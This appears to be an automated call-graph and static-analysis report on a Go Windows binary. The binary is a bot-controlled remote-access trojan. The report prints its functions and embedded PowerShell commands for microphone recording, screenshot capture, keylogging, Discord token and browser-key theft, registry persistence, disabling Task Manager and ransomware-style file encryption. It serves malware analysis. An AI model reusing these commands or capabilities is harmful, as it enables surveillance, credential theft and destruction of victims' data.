Win32_Battery).EstimatedChargeRemaining;if(-not $battery){$battery=\"N/A\"};$result=[PSCustomObject]@{OS=$os.Caption;OSVersion=$os.Version;OSBuild=$os.BuildNumber;Hostname=$env:COMPUTERNAME;Username=$env:USERNAME;Manufacturer=$cs.Manufacturer;Model=$cs.Model;Serial=$bios.SerialNumber;BIOSVersion=$bios.SMBIOSBIOSVersion;BIOSDate=$bios.ReleaseDate;CPU=$cpu.Name;CPUCores=$cpu.NumberOfCores;CPUThreads=$cpu.NumberOfLogicalProcessors;CPUClock=$cpu.MaxClockSpeed;RAMTotal=$ram;RAMFree=$ramFree;GPU=$gpu.Name;GPUVRAM=[math]::Round($gpu.AdapterRAM/1GB,1);LocalIP=$localIP;MAC=$mac;Gateway=$gateway;DNS=$dns;WiFi=$wifi;WiFiSignal=$wifiSignal;Antivirus=$av;Firewall=$fw;Timezone=$timezone;Locale=$locale;SoftwareCount=$swCount;ProcessCount=$procCount;Battery=\"$battery\"};$result|ConvertTo-Json -Compress")
+  0x693a95 -> encoding/json.Unmarshal
+  0x693aa6 -> indirect_call
+  0x694075 -> fmt.Sprintf
+  0x69408a -> indirect_call
+main.listUSBDevices
+  0x695420 -> main.executeCommand("wmic path Win32_USBHub get DeviceID,Description")
+  0x695440 -> strings.genSplit("\n")
+  0x695454 -> indirect_call
+  0x6954b2 -> strings.TrimSpace
+  0x6955ae -> strings.Join
+main.shutdownSystem
+  0x6980e0 -> os/exec.Command("shutdown")
+  0x6980e5 -> os/exec.(*Cmd).Start
+  0x6980f6 -> indirect_call
+main.handleCommand.gowrap3
+  0x6a0643 -> main.downloadFile
+main.downloadFile
+  0x694100 -> os.Stat
+  0x6941e0 -> main.(*ProxyBot).SendRequest
+  0x694202 -> indirect_call
+  0x694220 -> main.isTextFile
+  0x694240 -> indirect_call
+  0x6942a0 -> fmt.Sprintf
+  0x69434e -> main.(*ProxyBot).SendRequest
+  0x694374 -> main.sendLargeFileAsText
+  0x694392 -> os.ReadFile
+  0x6943b0 -> indirect_call
+  0x694478 -> main.(*ProxyBot).SendRequest
+  0x6944a9 -> internal/filepathlite.Base
+  0x6944e0 -> main.(*ProxyBot).SendDocument
+  0x69450c -> indirect_call
+  0x69452a -> main.isTextFile
+  0x6945d8 -> main.(*ProxyBot).SendRequest
+  0x694668 -> fmt.Sprintf
+  0x694680 -> main.sendAsTextMessages
+  0x69469b -> indirect_call
+  0x694764 -> main.(*ProxyBot).SendRequest
+  0x694783 -> indirect_call
+  0x694821 -> fmt.Sprintf
+  0x6948cf -> main.(*ProxyBot).SendRequest
+main.isTextFile
+  0x695089 -> strings.ToLower
+main.sendLargeFileAsText
+  0x69496f -> os.OpenFile
+  0x6949c2 -> internal/filepathlite.Base
+  0x694a18 -> fmt.Sprintf
+  0x694ac6 -> main.(*ProxyBot).SendRequest
+  0x694af8 -> indirect_call -> main.sendLargeFileAsText.deferwrap1
+  0x694bc0 -> main.(*ProxyBot).SendRequest
+  0x694c6d -> fmt.Sprintf
+  0x694ca0 -> main.sendAsTextMessages
+  0x694ccd -> os.(*File).Read
+  0x694d5d -> indirect_call
+  0x694e24 -> main.(*ProxyBot).SendRequest
+  0x694e39 -> indirect_call
+  0x694e8d -> fmt.Sprintf
+  0x694f40 -> main.(*ProxyBot).SendRequest
+  0x694f55 -> indirect_call
+main.sendLargeFileAsText.deferwrap1
+  0x694fe8 -> os.(*file).close
+main.(*ProxyBot).SendDocument
+  0x68f430 -> encoding/base64.(*Encoding).EncodeToString
+  0x68f50f -> main.(*ProxyBot).SendRequest
+main.blockSite
+  0x6971fa -> fmt.Sprintf("127.0.0.1 %s\n")
+  0x697220 -> os.OpenFile("C:\\Windows\\System32\\drivers\\etc\\hosts")
+  0x69726c -> os.(*File).Write
+  0x69727d -> indirect_call -> main.blockSite.deferwrap1
+  0x6972af -> indirect_call
+  0x697306 -> fmt.Sprintf
+  0x697322 -> indirect_call
+  0x69733b -> indirect_call
+main.blockSite.deferwrap1
+  0x697408 -> os.(*file).close
+main.getClipboard
+  0x6936da -> main.runPowershellCommand("Get-Clipboard")
+  0x6936ec -> indirect_call
+main.handleCommand.func1
+  0x6a0704 -> main.downloadFile
+  0x6a0713 -> os.Remove
+main.handleCommand.func2
+  0x6a06a4 -> main.downloadFile
+  0x6a06b3 -> os.Remove
+main.getKeylog
+  0x696fb2 -> os.tempDir
+  0x696fef -> path/filepath.join
+  0x696ff4 -> os.ReadFile
+  0x69702d -> fmt.Errorf("No keylog found or error: %v")
+main.stopKeylogger
+  0x696e2c -> internal/sync.(*Mutex).lockSlow
+  0x696e81 -> os.(*Process).signal
+  0x696ecb -> indirect_call -> main.stopKeylogger.deferwrap1
+  0x696f00 -> indirect_call
+internal/sync.(*Mutex).lockSlow
+  0x47f874 -> internal/sync.runtime_canSpin
+  0x47f8f4 -> internal/sync.throw("sync: inconsistent mutex state")
+  0x47f952 -> internal/sync.runtime_nanotime
+  0x47f978 -> internal/sync.runtime_SemacquireMutex
+  0x47f992 -> internal/sync.runtime_nanotime
+  0x47fa07 -> internal/sync.runtime_doSpin
+  0x47fa60 -> internal/sync.throw("sync: inconsistent mutex state")
+internal/sync.runtime_canSpin
+  <no direct calls>
+internal/sync.throw
+  <no direct calls>
+internal/sync.runtime_nanotime
+  <no direct calls>
+internal/sync.runtime_SemacquireMutex
+  <no direct calls>
+internal/sync.runtime_doSpin
+  <no direct calls>
+main.stopKeylogger.deferwrap1
+  0x696f6a -> internal/sync.(*Mutex).unlockSlow
+internal/sync.(*Mutex).unlockSlow
+  0x47fb30 -> internal/sync.fatal("sync: unlock of unlocked mutex")
+  0x47fb54 -> internal/sync.runtime_Semrelease
+  0x47fb96 -> internal/sync.runtime_Semrelease
+internal/sync.fatal
+  <no direct calls>
+internal/sync.runtime_Semrelease
+  <no direct calls>
+main.startKeylogger
+  0x696af5 -> internal/sync.(*Mutex).lockSlow
+  0x696b68 -> indirect_call -> main.startKeylogger.deferwrap1
+  0x696c21 -> os/exec.Command("powershell")
+  0x696c8b -> os/exec.(*Cmd).Start
+  0x696cc0 -> indirect_call
+  0x696cf5 -> indirect_call
+  0x696d2f -> indirect_call
+main.startKeylogger.deferwrap1
+  0x696daa -> internal/sync.(*Mutex).unlockSlow
+main.listProcesses
+  0x693620 -> main.executeCommand("tasklist")
+  0x693677 -> indirect_call
+main.handleCommand.gowrap5
+  0x6a0580 -> main.recordMicAndSend
+main.recordMicAndSend
+  0x697b2e -> main.runPowershellCommand("Add-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class AudioRecorder {\n    [DllImport(\"winmm.dll\", EntryPoint = \"mciSendStringA\")]\n    public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);\n}\n\"@\n$wav = \"$env:TEMP\\mic_record.wav\"\n[AudioRecorder]::mciSendString(\"open new Type waveaudio Alias recsound\", $null, 0, 0) | Out-Null\n[AudioRecorder]::mciSendString(\"set recsound time format ms\", $null, 0, 0) | Out-Null\n[AudioRecorder]::mciSendString(\"record recsound\", $null, 0, 0) | Out-Null\nStart-Sleep -Seconds 15\n[AudioRecorder]::mciSendString(\"stop recsound\", $null, 0, 0) | Out-Null\n[AudioRecorder]::mciSendString(\"save recsound $wav\", $null, 0, 0) | Out-Null\n[AudioRecorder]::mciSendString(\"close recsound\", $null, 0, 0) | Out-Null\nWrite-Output $wav")
+  0x697b43 -> indirect_call
+  0x697c04 -> main.(*ProxyBot).SendRequest
+  0x697c12 -> strings.TrimSpace
+  0x697c21 -> os.Stat
+  0x697c40 -> os.underlyingErrorIs
+  0x697ce9 -> main.(*ProxyBot).SendRequest
+  0x697d01 -> os.ReadFile
+  0x697d16 -> indirect_call
+  0x697dda -> main.(*ProxyBot).SendRequest
+  0x697e06 -> main.(*ProxyBot).SendDocument("mic_record.wav")
+  0x697e1b -> indirect_call
+  0x697ed5 -> main.(*ProxyBot).SendRequest
+  0x697f77 -> main.(*ProxyBot).SendRequest
+  0x697f86 -> os.Remove
+main.setWallpaperFromURL
+  0x695759 -> net/http.(*Client).Get
+  0x6957cd -> indirect_call -> main.setWallpaperFromURL.deferwrap1
+  0x695821 -> io.ReadAll
+  0x695840 -> os.tempDir
+  0x695889 -> path/filepath.join
+  0x6958ad -> os.WriteFile
+  0x695906 -> fmt.Sprintf("$code = '[DllImport(\"user32.dll\",SetLastError=true)]public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);';Add-Type -MemberDefinition $code -Name NativeMethods -Namespace Win32;[Win32.NativeMethods]::SystemParametersInfo(20, 0, \"%s\", 3)")
+  0x69590b -> main.runPowershellCommand
+  0x69591c -> indirect_call
+  0x695951 -> indirect_call
+  0x69598b -> indirect_call
+  0x6959a8 -> indirect_call
+  0x6959e0 -> indirect_call
+  0x6959fc -> indirect_call
+  0x695a31 -> indirect_call
+main.setWallpaperFromURL.deferwrap1
+  0x695b03 -> indirect_call
+main.setBrightness
+  0x695cb7 -> strconv.Atoi
+  0x695d20 -> fmt.Sprintf("(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,%d)")
+  0x695d25 -> main.runPowershellCommand
+  0x695d36 -> indirect_call
+  0x695d91 -> fmt.Sprintf
+main.deleteFile
+  0x6939b3 -> os.Remove
+  0x6939c4 -> indirect_call
+main.muteVolume
+  0x69387a -> main.runPowershellCommand("(New-Object -ComObject WScript.Shell).SendKeys([char]173)")
+  0x69388c -> indirect_call
+main.toggleRegistryPersistence
+  0x698f00 -> os.Executable
+  0x698fc4 -> os/exec.Command("reg")
+  0x698fc9 -> os/exec.(*Cmd).CombinedOutput
+  0x698ff1 -> internal/stringslite.Index
+  0x6990d6 -> os/exec.Command("reg")
+  0x6990e0 -> os/exec.(*Cmd).Run
+  0x6990f1 -> indirect_call
+  0x699219 -> os/exec.Command("reg")
+  0x699220 -> os/exec.(*Cmd).Run
+  0x699231 -> indirect_call
+  0x699271 -> indirect_call
+main.handleCommand.gowrap1
+  0x6a07c0 -> main.sendScreenshot
+main.sendScreenshot
+  0x691222 -> main.captureScreenshot
+  0x69126b -> fmt.Sprintf
+  0x69130a -> main.(*ProxyBot).SendRequest
+  0x6913c0 -> main.(*ProxyBot).SendRequest
+  0x6913e0 -> time.Now
+  0x6913f1 -> time.Time.Format
+  0x691438 -> fmt.Sprintf("screenshot-%s.png")
+  0x69145a -> main.(*ProxyBot).SendPhoto
+  0x6914a4 -> fmt.Sprintf
+  0x691543 -> main.(*ProxyBot).SendRequest
+main.captureScreenshot
+  0x68fd61 -> os.tempDir
+  0x68fd70 -> time.Now
+  0x68fe00 -> fmt.Sprintf("ss_%d.png")
+  0x68fe51 -> path/filepath.join
+  0x68fed8 -> fmt.Sprintf("Add-Type -A System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::AllScreens;$w=0;$h=0;$x=0;$y=0;$b|%%{if($_.Bounds.X -lt $x){$x=$_.Bounds.X};if($_.Bounds.Y -lt $y){$y=$_.Bounds.Y};$r=$_.Bounds.X+$_.Bounds.Width;$bt=$_.Bounds.Y+$_.Bounds.Height;if($r -gt $w){$w=$r};if($bt -gt $h){$h=$bt}};$w-=$x;$h-=$y;$bmp=New-Object System.Drawing.Bitmap($w,$h);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($x,$y,0,0,[System.Drawing.Size]::new($w,$h));$bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png);$g.Dispose();$bmp.Dispose()")
+  0x68ff5a -> os/exec.Command("powershell")
+  0x68ffa0 -> os/exec.(*Cmd).Run
+  0x68ffb8 -> os.ReadFile
+  0x68ffca -> main.captureScreenshotNative
+  0x68fff8 -> indirect_call -> main.captureScreenshot.deferwrap1
+  0x690041 -> indirect_call
+  0x690065 -> main.captureScreenshotNative
+  0x690093 -> indirect_call
+main.captureScreenshotNative
+  0x6901d0 -> syscall.(*LazyProc).Call
+  0x690202 -> syscall.(*LazyProc).Call
+  0x69022d -> syscall.(*LazyProc).Call
+  0x6902a0 -> syscall.(*LazyProc).Call
+  0x690320 -> syscall.(*LazyProc).Call
+  0x690397 -> syscall.(*LazyProc).Call
+  0x6903f2 -> syscall.(*LazyProc).Call
+  0x6903f7 -> os.tempDir
+  0x690409 -> time.Now
+  0x690498 -> fmt.Sprintf("ss_native_%d.bmp")
+  0x6904ec -> path/filepath.join
+  0x6905a4 -> fmt.Sprintf("Add-Type -A System.Drawing;$bmp=[System.Drawing.Bitmap]::FromHbitmap([IntPtr]%d);$bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png);$bmp.Dispose()")
+  0x690626 -> os/exec.Command("powershell")
+  0x690672 -> os/exec.(*Cmd).Run
+  0x690681 -> os.ReadFile
+  0x6906a7 -> fmt.Errorf("screenshot capture failed")
+  0x6906db -> indirect_call -> main.captureScreenshotNative.deferwrap4
+  0x6906ee -> indirect_call
+  0x690701 -> indirect_call
+  0x690714 -> indirect_call
+  0x690770 -> indirect_call
+  0x690782 -> indirect_call
+  0x690794 -> indirect_call
+  0x6907a6 -> indirect_call
+main.captureScreenshotNative.deferwrap4
+  0x690840 -> os.Remove
+main.captureScreenshot.deferwrap1
+  0x690120 -> os.Remove
+main.listWebcams
+  0x696900 -> main.runPowershellCommand("Get-WmiObject Win32_PnPEntity | Where-Object { $_.Service -eq \"usbvideo\" -or $_.Name -like \"*Camera*\" -or $_.Name -like \"*Imaging*\" } | Select-Object -ExpandProperty Name")
+  0x69690a -> strings.TrimSpace
+  0x69694c -> indirect_call
+main.getDiscordTokenFiles
+  0x698249 -> os.Getenv("APPDATA")
+  0x6982f9 -> path.Join
+  0x6983b0 -> path.Join
+  0x698467 -> path.Join
+  0x698555 -> os.ReadDir
+  0x6985f6 -> indirect_call
+  0x69868e -> indirect_call
+  0x6986e0 -> path.Join
+main.regexSearchTokenFiles
+  0x698800 -> regexp.MustCompile
+  0x698880 -> os.OpenFile
+  0x698960 -> os.(*file).close
+  0x6989ae -> bufio.(*Scanner).Scan
+  0x6989d9 -> regexp.(*Regexp).FindStringSubmatch
+main.listPrinters
+  0x695e80 -> main.runPowershellCommand("Get-WmiObject -Class Win32_Printer | Select-Object -ExpandProperty Name")
+  0x695e8a -> strings.TrimSpace
+  0x695ecc -> indirect_call
+main.unblockSite
+  0x697487 -> os.ReadFile("C:\\Windows\\System32\\drivers\\etc\\hosts")
+  0x6974b3 -> strings.genSplit("\n")
+  0x6974c9 -> indirect_call
+  0x697566 -> internal/stringslite.Index
+  0x697603 -> strings.Join
+  0x697630 -> os.WriteFile("C:\\Windows\\System32\\drivers\\etc\\hosts")
+  0x697641 -> indirect_call
+  0x6976b2 -> fmt.Sprintf
+main.handleCommand.gowrap4
+  0x6a05e0 -> main.disableInput
+main.disableInput
+  0x6977a0 -> main.(*ProxyBot).SendRequest
+  0x697846 -> syscall.(*LazyProc).Call
+  0x69785b -> indirect_call
+  0x697907 -> main.(*ProxyBot).SendRequest
+  0x697960 -> fmt.Sprintf
+  0x6979f6 -> main.(*ProxyBot).SendRequest
+  0x697a0a -> time.Sleep
+  0x697a2b -> syscall.(*LazyProc).Call
+  0x697ac0 -> main.(*ProxyBot).SendRequest
+main.getImportantDirectories
+  0x699c60 -> os/user.Current
+  0x699cc8 -> path/filepath.join
+  0x699d31 -> path/filepath.join
+  0x699d9a -> path/filepath.join
+  0x699e03 -> path/filepath.join
+  0x699e6c -> path/filepath.join
+  0x699ed5 -> path/filepath.join
+main.encryptDirectory
+  0x699937 -> path/filepath.Walk -> main.encryptDirectory.func1
+main.encryptDirectory.func1
+  0x6999ca -> indirect_call
+  0x699a15 -> main.encryptFile
+main.encryptFile
+  0x6992ca -> os.ReadFile
+  0x699315 -> crypto/rand.Read
+  0x699360 -> golang.org/x/crypto/pbkdf2.Key
+  0x699365 -> crypto/aes.NewCipher
+  0x699373 -> crypto/cipher.NewGCM
+  0x69939d -> indirect_call
+  0x6993c6 -> crypto/rand.Read
+  0x699433 -> indirect_call
+  0x699503 -> os.WriteFile
+  0x699526 -> os.Remove
+golang.org/x/crypto/pbkdf2.Key
+  0x68dfd6 -> crypto/hmac.New
+  0x68dfef -> indirect_call
+  0x68e10f -> indirect_call
+  0x68e13d -> indirect_call
+  0x68e188 -> indirect_call
+  0x68e1b0 -> indirect_call
+  0x68e2fa -> indirect_call
+  0x68e322 -> indirect_call
+  0x68e347 -> indirect_call
+main.getCurrentWallpaper
+  0x695b60 -> main.runPowershellCommand("(Get-ItemProperty 'HKCU:\\Control Panel\\Desktop\\' Wallpaper).Wallpaper")
+  0x695b99 -> fmt.Errorf("Failed to get wallpaper path: %v")
+  0x695bb7 -> strings.TrimSpace
+  0x695bd3 -> os.ReadFile
+  0x695c0c -> fmt.Errorf("Failed to read wallpaper file: %v")
+  0x695c60 -> fmt.Errorf("Wallpaper path not found")
+main.changeWallpaperToMessage
+  0x69a00b -> os.tempDir
+  0x69a048 -> path/filepath.join
+  0x69a0c5 -> fmt.Sprintf("Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $bitmap = New-Object System.Drawing.Bitmap(1920, 1080); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.Clear([System.Drawing.Color]::Black); $font = New-Object System.Drawing.Font(\"Arial\", 48, [System.Drawing.FontStyle]::Bold); $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red); $text = \"%s\"; $lines = $text -split \"\\n\"; $lineHeight = $font.GetHeight($graphics); $totalHeight = $lines.Count * $lineHeight; $startY = (1080 - $totalHeight) / 2; for ($i = 0; $i -lt $lines.Count; $i++) { $line = $lines[$i]; $lineSize = $graphics.MeasureString($line, $font); $x = (1920 - $lineSize.Width) / 2; $y = $startY + ($i * $lineHeight); $graphics.DrawString($line, $font, $brush, $x, $y) }; $bitmap.Save(\"%s\", [System.Drawing.Imaging.ImageFormat]::Bmp); $graphics.Dispose(); $bitmap.Dispose()")
+  0x69a0ca -> main.runPowershellCommand
+  0x69a117 -> fmt.Sprintf("\n$code = '[DllImport(\"user32.dll\",SetLastError=true)]public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);'\nAdd-Type -MemberDefinition $code -Name NativeMethods -Namespace Win32\n[Win32.NativeMethods]::SystemParametersInfo(20, 0, \"%s\", 3)\n")
+  0x69a120 -> main.runPowershellCommand
+  0x69a131 -> indirect_call
+  0x69a188 -> indirect_call
+main.setClipboard
+  0x693757 -> strings.Replace("\"", "\\\"")
+  0x693791 -> fmt.Sprintf("Set-Clipboard -Value \"%s\"")
+  0x6937da -> os/exec.Command("powershell")
+  0x6937e0 -> os/exec.(*Cmd).Run
+  0x6937f1 -> indirect_call
+main.enableTaskManager
+  0x69711a -> main.runPowershellCommand("Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -ErrorAction SilentlyContinue")
+  0x69712c -> indirect_call
+main.disableTaskManager
+  0x69709a -> main.runPowershellCommand("if (-not (Test-Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\")) {\n        New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Force\n    }\n    Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 1 -Force")
+  0x6970ac -> indirect_call
+main.getFirewallStatus
+  0x69569a -> main.runPowershellCommand("Get-NetFirewallProfile | Select-Object Name,Enabled | ConvertTo-Json")
+  0x6956ac -> indirect_call
+main.decryptDirectory
+  0x699ad7 -> path/filepath.Walk -> main.decryptDirectory.func1
+main.decryptDirectory.func1
+  0x699b6a -> indirect_call
+  0x699bb5 -> main.decryptFile
+main.decryptFile
+  0x699611 -> fmt.Errorf("file is not encrypted")
+  0x69962f -> os.ReadFile
+  0x6996c0 -> golang.org/x/crypto/pbkdf2.Key
+  0x6996c5 -> crypto/aes.NewCipher
+  0x6996d3 -> crypto/cipher.NewGCM
+  0x699711 -> indirect_call
+  0x6997ab -> indirect_call
+  0x699822 -> os.WriteFile
+  0x699845 -> os.Remove
+  0x699875 -> fmt.Errorf("invalid encrypted file")
+  0x6998b4 -> fmt.Errorf("invalid encrypted file")
+main.getAntivirusStatus
+  0x6955fa -> main.runPowershellCommand("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState | ConvertTo-Json")
+  0x695642 -> indirect_call
+main.emptyRecycleBin
+  0x695f20 -> main.runPowershellCommand("Clear-RecycleBin -Force")
+  0x695f40 -> internal/stringslite.Index("cannot find the path specified")
+  0x695f6a -> indirect_call
+main.getDecryptionKey
+  0x698b22 -> os.ReadFile
+  0x698b49 -> github.com/tidwall/gjson.Get("os_crypt.encrypted_key")
+  0x698c00 -> github.com/tidwall/gjson.Result.String
+  0x698c15 -> encoding/base64.(*Encoding).DecodeString
+  0x698c4b -> github.com/billgraziano/dpapi.decryptBytes
+github.com/tidwall/gjson.Get
+  0x685a81 -> github.com/tidwall/gjson.execModifier
+  0x685ad2 -> github.com/tidwall/gjson.execStatic
+  0x685b30 -> github.com/tidwall/gjson.parseSubSelectors
+  0x685c03 -> github.com/tidwall/gjson.Get
+  0x685d13 -> github.com/tidwall/gjson.Parse
+  0x685e60 -> github.com/tidwall/gjson.parseArray
+  0x685ea5 -> github.com/tidwall/gjson.parseArray
+  0x685ecb -> github.com/tidwall/gjson.parseObject
+  0x686060 -> github.com/tidwall/gjson.Result.Get
+  0x68620a -> github.com/tidwall/gjson.Get
+  0x6863a0 -> github.com/tidwall/gjson.Valid
+  0x686465 -> github.com/tidwall/gjson.AppendJSONString
+  0x68657a -> github.com/tidwall/gjson.Result.Get
+  0x686705 -> github.com/tidwall/gjson.Result.String
+  0x6868b2 -> github.com/tidwall/gjson.AppendJSONString
+  0x6868c2 -> github.com/tidwall/gjson.AppendJSONString
+github.com/tidwall/gjson.execModifier
+  0x6887c0 -> github.com/tidwall/gjson.Parse
+  0x688868 -> github.com/tidwall/gjson.squash
+  0x688924 -> indirect_call
+  0x6889b5 -> github.com/tidwall/gjson.squash
+github.com/tidwall/gjson.Parse
+  0x67f0c1 -> github.com/tidwall/gjson.tonum
+  0x67f166 -> github.com/tidwall/gjson.tostr
+  0x67f1ba -> github.com/tidwall/gjson.tonum
+github.com/tidwall/gjson.tonum
+  0x67f576 -> strconv.ParseFloat
+  0x67f593 -> strconv.ParseFloat
+  0x67f5b2 -> strconv.ParseFloat
+github.com/tidwall/gjson.tostr
+  0x67f6ee -> github.com/tidwall/gjson.unescape
+  0x67f737 -> github.com/tidwall/gjson.unescape
+github.com/tidwall/gjson.unescape
+  0x686c86 -> strconv.ParseUint
+  0x686d54 -> strconv.ParseUint
+  0x686e94 -> unicode/utf8.encodeRuneNonASCII
+github.com/tidwall/gjson.squash
+  <no direct calls>
+github.com/tidwall/gjson.execStatic
+  0x68844b -> github.com/tidwall/gjson.parseSquash
+  0x68852a -> strings.ToLower
+github.com/tidwall/gjson.parseSquash
+  <no direct calls>
+github.com/tidwall/gjson.parseSubSelectors
+  <no direct calls>
+github.com/tidwall/gjson.parseArray
+  0x682625 -> github.com/tidwall/gjson.parseArrayPath
+  0x682892 -> github.com/tidwall/gjson.parseString
+  0x682993 -> github.com/tidwall/gjson.unescape
+  0x682a62 -> indirect_call
+  0x682b00 -> github.com/tidwall/gjson.parseArray
+  0x682b6e -> github.com/tidwall/gjson.parseSquash
+  0x682c62 -> indirect_call
+  0x682d30 -> github.com/tidwall/gjson.parseObject
+  0x682da0 -> github.com/tidwall/gjson.parseSquash
+  0x682ea2 -> indirect_call
+  0x68306b -> github.com/tidwall/gjson.unescape
+  0x6831b9 -> github.com/tidwall/gjson.splitPossiblePipe
+  0x6832a0 -> strconv.FormatInt
+  0x68373b -> indirect_call
+  0x683895 -> strconv.ParseFloat
+  0x68391a -> strconv.ParseFloat
+  0x683983 -> indirect_call
+  0x683ae2 -> github.com/tidwall/gjson.parseAny
+  0x683be1 -> github.com/tidwall/gjson.Result.Get
+  0x683dc0 -> github.com/tidwall/gjson.Result.String
+github.com/tidwall/gjson.parseArrayPath
+  0x67fa20 -> github.com/tidwall/gjson.parseQuery
+  0x67fa81 -> github.com/tidwall/gjson.unescape
+github.com/tidwall/gjson.parseQuery
+  <no direct calls>
+github.com/tidwall/gjson.parseString
+  <no direct calls>
+github.com/tidwall/gjson.parseObject
+  0x680f58 -> github.com/tidwall/gjson.parseObjectPath
+  0x6810e1 -> github.com/tidwall/gjson.unescape
+  0x681132 -> github.com/tidwall/gjson.unescape
+  0x681146 -> github.com/tidwall/match.MatchLimit
+  0x681165 -> github.com/tidwall/match.MatchLimit
+  0x6811b5 -> github.com/tidwall/gjson.parseString
+  0x681225 -> github.com/tidwall/gjson.parseArray
+  0x681240 -> github.com/tidwall/gjson.parseSquash
+  0x6812a0 -> github.com/tidwall/gjson.parseObject
+  0x6812b7 -> github.com/tidwall/gjson.parseSquash
+  0x6814b1 -> github.com/tidwall/gjson.unescape
+  0x6817af -> strconv.ParseFloat
+github.com/tidwall/gjson.parseObjectPath
+  <no direct calls>
+github.com/tidwall/match.MatchLimit
+  0x67acc4 -> github.com/tidwall/match.match
+github.com/tidwall/match.match
+  0x67ade0 -> unicode/utf8.DecodeRuneInString
+  0x67ae33 -> unicode/utf8.DecodeRuneInString
+  0x67aeda -> unicode/utf8.DecodeRuneInString
+  0x67afda -> github.com/tidwall/match.matchTrimSuffix
+  0x67b035 -> github.com/tidwall/match.match
+github.com/tidwall/match.matchTrimSuffix
+  0x67b17a -> unicode/utf8.DecodeLastRuneInString
+  0x67b1c0 -> unicode/utf8.DecodeLastRuneInString
+github.com/tidwall/gjson.splitPossiblePipe
+  0x684980 -> github.com/tidwall/gjson.squash
+github.com/tidwall/gjson.parseAny
+  0x68719a -> github.com/tidwall/gjson.parseString
+  0x687210 -> github.com/tidwall/gjson.unescape
+  0x687331 -> github.com/tidwall/gjson.parseSquash
+  0x687560 -> strconv.ParseFloat
+github.com/tidwall/gjson.Result.Get
+  0x67edd3 -> github.com/tidwall/gjson.Get
+github.com/tidwall/gjson.Result.String
+  0x67e1a0 -> strconv.genericFtoa
+  0x67e276 -> strconv.genericFtoa
+github.com/tidwall/gjson.Valid
+  0x68838a -> github.com/tidwall/gjson.validpayload
+github.com/tidwall/gjson.validpayload
+  0x6877af -> github.com/tidwall/gjson.validany
+github.com/tidwall/gjson.validany
+  0x6878c8 -> github.com/tidwall/gjson.validstring
+  0x6878e9 -> github.com/tidwall/gjson.validnumber
+  0x687992 -> github.com/tidwall/gjson.validarray
+  0x687a93 -> github.com/tidwall/gjson.validobject
+github.com/tidwall/gjson.validstring
+  <no direct calls>
+github.com/tidwall/gjson.validnumber
+  <no direct calls>
+github.com/tidwall/gjson.validarray
+  0x687e67 -> github.com/tidwall/gjson.validany
+github.com/tidwall/gjson.validobject
+  0x687c00 -> github.com/tidwall/gjson.validstring
+  0x687c49 -> github.com/tidwall/gjson.validany
+github.com/tidwall/gjson.AppendJSONString
+  0x6856f9 -> unicode/utf8.DecodeRuneInString
+github.com/billgraziano/dpapi.decryptBytes
+  0x678124 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x6781e2 -> golang.org/x/sys/windows.(*LazyProc).Call
+  0x67828d -> github.com/billgraziano/dpapi.(*dataBlob).free
+  0x6782c0 -> github.com/pkg/errors.Wrap("procdecryptdata")
+github.com/billgraziano/dpapi.(*dataBlob).free
+  0x677f72 -> golang.org/x/sys/windows.LocalFree
+  0x677f8e -> github.com/pkg/errors.Wrap("localfree")
+github.com/pkg/errors.Wrap
+  0x66fe53 -> github.com/pkg/errors.callers
+github.com/pkg/errors.callers
+  <no direct calls>
+main.decryptDiscordToken
+  0x698d0a -> encoding/base64.(*Encoding).DecodeString
+  0x698d54 -> crypto/aes.NewCipher
+  0x698d96 -> crypto/cipher.NewGCM
+  0x698e05 -> indirect_call
+  0x698e68 -> fmt.Errorf("invalid token length")
+
+Semantic analysis
+  assessment_hints:
+    - Reachable code references suspicious high-entropy or magic-containing data blobs.
+    - Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime.
+  mid_function_control_transfers:
+    - github.com/tidwall/gjson.Get:0x685a2e call -> runtime.duffzero+0x150 classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x685c73 call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x685caa call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x685d8a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x685e0c call -> runtime.duffzero+0x146 classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x685f6a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x685fea call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x6860d0 call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x68610a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - github.com/tidwall/gjson.Get:0x68628a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+  indirect_calls:
+    - github.com/tidwall/gjson.execModifier:0x688924 call r8 [interface_method_or_object_dispatch] evidence=target comes from register R8; target uses register-indirect memory addressing
+    - github.com/tidwall/gjson.parseArray:0x682a62 call r12 [unresolved_indirect_call] evidence=target comes from register unknown
